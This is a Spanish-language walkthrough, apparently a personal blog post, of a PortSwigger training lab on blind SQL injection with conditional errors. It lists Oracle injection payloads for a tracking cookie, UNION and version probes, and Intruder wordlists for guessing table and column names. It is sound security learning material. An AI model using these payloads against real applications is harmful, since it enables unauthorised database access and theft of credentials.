---
title: "12 Blind SQL injection with conditional errors"
collection: publications
category: portswigger
permalink: /publications/12_Blind SQL injection with conditional errors
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en ciego en la base de datos que recupera la contraseña del usuario administrador en la aplicación.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind SQL injection with conditional errors'
---

![logo]({{site.url}}/images/SQLi/sqli-12/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-12/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, inicia sesión como usuario `administrator`.

## Analisis del campo vulnerable

En esta ocación vamos a probar el `TrackingId` si es vulnerable a SQLi. Necesitamos averiguar tambien si es BD Oracle o Mysql.

```sql
' || (SELECT '' FROM dual) || '         -> Payload para BD Oracle  ✅
' || (SELECT '') || '                   -> Payload para BD Mysql   ❌
```

![Vulnerable]({{site.url}}/images/SQLi/sqli-12/vulnerable.png)

## Miramos cuantas columnas tiene

En este caso apenas 1 columna es vulnerable

```javascript
' ORDER BY 1--
```

![Columnas]({{site.url}}/images/SQLi/sqli-12/columnas.png)

## Miramos que el campo sea String

El campo es de tipo `String`, hacemos el llamado a la tabla DUAL ya que estamos ante una BD Oracle

```javascript
' UNION SELECT 'A' FROM DUAL--
```

![String]({{site.url}}/images/SQLi/sqli-12/campos.png)

## Miramos que BD esta corriendo

[Hoja de Trucos](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Como de antemano la consulta tocó ingresarle la tabla DUAL de Oracle, vamos a corroborar que sea Oracle. Como nos arroja una respuesta `200` sabemos que es oracle.

```sql
' UNION SELECT banner FROM v$version--
```

![Oracle]({{site.url}}/images/SQLi/sqli-12/oracle.png)

## Comprobamos nombre de tablas

Ya que `no` conocemos las tablas que tiene la BD, haremos un ataque para comprobar que tablas existen. Si existe la tabla tendra que mostrar un estado `200` ya que estamos trabajando con Blind SQL 

```sql
' || (SELECT '' FROM payload WHERE rownum =1 ) || '
```

Vamos a usar la herramienta intruder para hacer el ataque.
Ejemplo de nombre de tablas:

```text
products
items
inventory
orders
order_items
sales
transactions
pricing
categories
customers
clients
users
profiles
subscriptions
addresses
```

![Intruder]({{site.url}}/images/SQLi/sqli-12/Intruder.png)

Cargamos los posibles nombres de tablas y filtramos por estado `200` y vemos que la tabla se llama `users`

![Estado]({{site.url}}/images/SQLi/sqli-12/estado.png)

## Comprobamos nombres de los campos que tiene la tablas

En Oracle, puedes forzar un error explícito utilizando una operación inválida o una referencia que dependa de la existencia de la columna.

```sql
' AND (SELECT COUNT(NOMBRE_COLUMNA) FROM NOMBRE_TABLA) > 0--

```

Lista de nombres para listar columnas de una tabla.
```list
id
user_id
username
email
phone_number
uuid
password
hashed_password
salt
token
last_login
login_attempts
first_name
last_name
full_name
date_of_birth
gender
address
city
state
country
postal_code
role
role_id
permissions
is_admin
is_active
```

Realizamos un ataque y analizar el estado de la respuesta, si es un estado 200 ok, es valido sino no existe la columna dentro de la tabla.

![Columna]({{site.url}}/images/SQLi/sqli-12/columna.png)

Filtramos por las que tengan estado `200`

![Columna]({{site.url}}/images/SQLi/sqli-12/lista columnas.png)
